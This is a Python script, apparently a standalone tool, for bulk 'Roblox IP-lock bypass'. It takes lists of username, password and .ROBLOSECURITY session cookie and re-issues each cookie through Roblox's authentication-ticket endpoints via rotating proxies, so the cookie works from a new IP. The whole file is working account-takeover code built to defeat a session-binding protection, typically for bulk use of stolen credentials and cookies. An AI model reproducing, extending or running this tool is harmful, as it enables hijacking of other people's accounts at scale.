"""
Cookie Refresher — Roblox IP-lock bypass in bulk.

Reads accounts (user:pass:cookie) from an accounts file, refreshes each
.ROBLOSECURITY through a proxy from a proxy file (so the new cookie binds to the
proxy IP), and writes the refreshed accounts out. Multi-threaded.

Usage:
    python cookie_refresher.py
        -> reads acc.txt + proxy.txt, asks for thread count, writes
           output_refreshed.txt
    python cookie_refresher.py --accounts acc.txt --proxies proxy.txt \
        --output output_refreshed.txt --threads 20

Proxy file: one proxy per line, any of:
    scheme://user:pass@host:port      (http/https/socks5)
    host:port:user:pass
    host:port
Lines starting with # are ignored.
"""

import argparse
import os
import random
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

# Resolve default files next to this script, so it works no matter which
# directory you launch it from.
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

LOGOUT_URL = "https://auth.roblox.com/v2/logout"
TICKET_URL = "https://auth.roblox.com/v1/authentication-ticket"
REDEEM_URL = "https://auth.roblox.com/v1/authentication-ticket/redeem"

_print_lock = threading.Lock()
_write_lock = threading.Lock()


def log(tag: str, msg: str) -> None:
    with _print_lock:
        print(f"[{tag}] {msg}", flush=True)


class RefreshError(Exception):
    pass


class Bypass:
    """Port of efenatuyo/roblox-ip-lock-bypass, with proxy + timeout support."""

    def __init__(self, cookie: str, proxies: dict | None = None, timeout: int = 30):
        self.cookie = cookie
        self.timeout = timeout
        self.session = requests.Session()
        if proxies:
            self.session.proxies.update(proxies)

    def start_process(self) -> str:
        csrf = self._get_csrf_token()
        ticket = self._get_authentication_ticket(csrf)
        return self._redeem(ticket)

    def _get_csrf_token(self) -> str:
        r = self.session.post(
            LOGOUT_URL,
            cookies={".ROBLOSECURITY": self.cookie},
            timeout=self.timeout,
        )
        token = r.headers.get("x-csrf-token")
        if not token:
            raise RefreshError("no x-csrf-token (invalid/expired cookie?)")
        return token

    def _get_authentication_ticket(self, csrf: str) -> str:
        r = self.session.post(
            TICKET_URL,
            headers={
                "rbxauthenticationnegotiation": "1",
                "referer": "https://www.roblox.com/camel",
                "Content-Type": "application/json",
                "x-csrf-token": csrf,
            },
            cookies={".ROBLOSECURITY": self.cookie},
            timeout=self.timeout,
        )
        ticket = r.headers.get("rbx-authentication-ticket")
        if not ticket:
            raise RefreshError(f"no auth ticket (status {r.status_code})")
        return ticket

    def _redeem(self, ticket: str) -> str:
        r = self.session.post(
            REDEEM_URL,
            headers={"rbxauthenticationnegotiation": "1"},
            json={"authenticationTicket": ticket},
            timeout=self.timeout,
        )
        new_cookie = r.cookies.get(".ROBLOSECURITY")
        if not new_cookie:
            raise RefreshError(f"no .ROBLOSECURITY in redeem (status {r.status_code})")
        return new_cookie


def normalize_proxy(raw: str) -> str:
    """Turn a proxy line into a scheme://user:pass@host:port url."""
    raw = raw.strip()
    if not raw:
        return ""
    if "://" in raw:
        return raw
    parts = raw.split(":")
    if len(parts) == 4:  # host:port:user:pass
        host, port, user, pw = parts
        return f"http://{user}:{pw}@{host}:{port}"
    return f"http://{raw}"  # host:port


def load_lines(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8") as f:
        return [ln.strip() for ln in f if ln.strip() and not ln.startswith("#")]


def parse_account(line: str):
    """user:pass:cookie — the cookie itself contains colons, so keep the rest."""
    parts = line.split(":", 2)
    if len(parts) != 3:
        return None
    return parts[0], parts[1], parts[2]


def mask(cookie: str) -> str:
    return f"{cookie[:12]}...{cookie[-8:]}" if len(cookie) > 25 else "(short)"


def refresh_one(user, password, cookie, proxies):
    proxy = random.choice(proxies) if proxies else ""
    proxy_dict = {"http": proxy, "https": proxy} if proxy else None
    try:
        new_cookie = Bypass(cookie, proxy_dict).start_process()
        if new_cookie == cookie:
            raise RefreshError("cookie unchanged")
        return user, password, new_cookie, None
    except requests.RequestException as e:
        return user, password, cookie, f"network: {e.__class__.__name__}"
    except RefreshError as e:
        return user, password, cookie, str(e)


def ask_threads(default: int = 10) -> int:
    """Prompt for a thread count; blank/invalid falls back to default."""
    try:
        raw = input(f"So luong (threads) [{default}]: ").strip()
    except EOFError:
        return default
    if not raw:
        return default
    try:
        return max(1, int(raw))
    except ValueError:
        log("WARN", f"'{raw}' khong hop le, dung {default}")
        return default


def main() -> int:
    ap = argparse.ArgumentParser(description="Bulk Roblox cookie refresher")
    ap.add_argument("--accounts", default=os.path.join(BASE_DIR, "acc.txt"))
    ap.add_argument("--proxies", default=os.path.join(BASE_DIR, "proxy.txt"))
    ap.add_argument("--output", default=os.path.join(BASE_DIR, "output_refreshed.txt"))
    ap.add_argument(
        "--threads",
        type=int,
        default=None,
        help="number of worker threads (asked interactively if omitted)",
    )
    ap.add_argument(
        "--keep-failed",
        action="store_true",
        help="also write accounts whose refresh failed (with original cookie)",
    )
    args = ap.parse_args()

    if args.threads is None:
        args.threads = ask_threads()
    if args.threads < 1:
        args.threads = 1

    try:
        raw_accounts = load_lines(args.accounts)
    except OSError as e:
        log("ERROR", f"cannot read accounts: {e}")
        return 1

    accounts = [a for a in (parse_account(ln) for ln in raw_accounts) if a]
    if not accounts:
        log("ERROR", "no valid accounts found")
        return 1

    try:
        proxies = [normalize_proxy(p) for p in load_lines(args.proxies)]
    except OSError:
        proxies = []
    if not proxies:
        log("WARN", "no proxies loaded — refreshing directly (binds to your IP)")

    log("INFO", f"{len(accounts)} accounts, {len(proxies)} proxies, {args.threads} threads")

    ok = 0
    fail = 0
    out = open(args.output, "w", encoding="utf-8")

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = [
            pool.submit(refresh_one, u, p, c, proxies) for (u, p, c) in accounts
        ]
        for fut in as_completed(futures):
            user, password, cookie, err = fut.result()
            if err is None:
                ok += 1
                with _write_lock:
                    out.write(f"{user}:{password}:{cookie}\n")
                    out.flush()
                log("OK", f"{user} -> {mask(cookie)}")
            else:
                fail += 1
                if args.keep_failed:
                    with _write_lock:
                        out.write(f"{user}:{password}:{cookie}\n")
                        out.flush()
                log("FAIL", f"{user} - {err}")

    out.close()
    log("DONE", f"success {ok} / fail {fail} -> {args.output}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
